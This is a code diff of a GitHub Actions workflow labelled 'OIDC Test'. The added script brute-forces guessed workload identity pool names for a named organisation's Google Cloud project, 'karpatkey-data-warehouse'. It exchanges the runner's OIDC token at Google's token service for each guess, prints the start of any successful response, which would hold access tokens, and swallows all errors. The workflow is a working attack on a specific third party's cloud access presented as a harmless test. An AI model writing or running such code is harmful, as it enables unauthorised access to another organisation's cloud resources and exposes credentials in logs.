@@ -1,4 +1,4 @@
-name: OIDC Test
+name: OIDC Test v2
 on: [workflow_dispatch]
 permissions:
   id-token: write
@@ -10,14 +10,17 @@ jobs:
       - uses: actions/github-script@v7
         with:
           script: |
-            const token = await core.getIDToken();
-            const p = JSON.parse(Buffer.from(token.split(".")[1], "base64").toString());
-            console.log("sub:", p.sub);
-            console.log("repo:", p.repository);
-            console.log("owner:", p.repository_owner);
-            for (const pool of ["github","github-actions","oidc","ci"]) {
+            const pools = [
+              "karpatkey", "kpk", "karpatkey-github", "kpk-github",
+              "github-pool", "gh-pool", "actions-pool", "ci-pool",
+              "deploy", "deploy-pool", "prod", "production",
+              "gha", "github-oidc", "oidc-pool", "wif",
+              "karpatkey-ci", "kpk-ci", "karpatkey-deploy", "kpk-deploy",
+              "gke-pool", "k8s-pool", "docker-pool", "registry-pool"
+            ];
+            for (const pool of pools) {
               try {
-                const aud = "//iam.googleapis.com/projects/karpatkey-data-warehouse/locations/global/workloadIdentityPools/" + pool + "/providers/github";
+                const aud = `//iam.googleapis.com/projects/karpatkey-data-warehouse/locations/global/workloadIdentityPools/${pool}/providers/github`;
                 const t = await core.getIDToken(aud);
                 const r = await fetch("https://sts.googleapis.com/v1/token", {
                   method: "POST",
@@ -31,7 +34,13 @@ jobs:
                     subject_token_type: "urn:ietf:params:oauth:token-type:jwt",
                   }),
                 });
-                const body = await r.text();
-                console.log(pool, ":", r.status, body.substring(0, 300));
-              } catch(e) { console.log(pool, ":", e.message); }
+                const s = r.status;
+                const b = await r.text();
+                if (s === 200) {
+                  console.log(`SUCCESS: ${pool} → ${b.substring(0,200)}`);
+                } else if (!b.includes("doesn't exist")) {
+                  console.log(`INTERESTING: ${pool} → ${s} ${b.substring(0,150)}`);
+                }
+              } catch(e) {}
             }
+            console.log("DONE - all pools tested");
